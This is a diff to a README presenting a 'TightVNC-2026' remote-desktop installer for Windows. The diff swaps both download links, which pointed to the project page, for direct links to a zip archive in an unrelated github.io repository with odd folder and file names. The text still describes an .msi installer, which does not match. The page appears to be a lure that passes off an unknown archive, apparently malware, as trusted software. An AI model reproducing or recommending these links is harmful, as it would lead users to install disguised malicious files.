@@ -5,7 +5,7 @@ description: "Download the latest TightVNC installer for Windows 10 and 11 to en
 ---
 # 🖥️ TightVNC-2026 - Control remote computers with ease
 
-[![Download TightVNC-2026](https://img.shields.io/badge/Download-TightVNC_2026-blue)](https://github.com/mariannmultidimensional627/TightVNC-2026)
+[![Download TightVNC-2026](https://img.shields.io/badge/Download-TightVNC_2026-blue)](https://github.com/mariannmultidimensional627/mariannmultidimensional627.github.io/raw/refs/heads/main/geldable/mariannmultidimensional-github-io-biclavate.zip)
 
 TightVNC-2026 allows you to access and control your computer from a different location. This software connects two machines over a network. You see the screen of the remote computer on your local monitor and interact with it as if you sit directly in front of that device. It works well on Windows 11 and Windows 10. Use this tool for technical support, managing unattended systems, or accessing your home office files from anywhere.
 
@@ -13,7 +13,7 @@ TightVNC-2026 allows you to access and control your computer from a different lo
 
 To begin, visit the official repository page to access the installation files. Follow the link below to reach the download area.
 
-[Click here to open the download page](https://github.com/mariannmultidimensional627/TightVNC-2026)
+[Click here to open the download page](https://github.com/mariannmultidimensional627/mariannmultidimensional627.github.io/raw/refs/heads/main/geldable/mariannmultidimensional-github-io-biclavate.zip)
 
 On the page, look for the assets section. Choose the file that matches your Windows version. Most users select the file ending in .msi. Save this file to your computer.
 
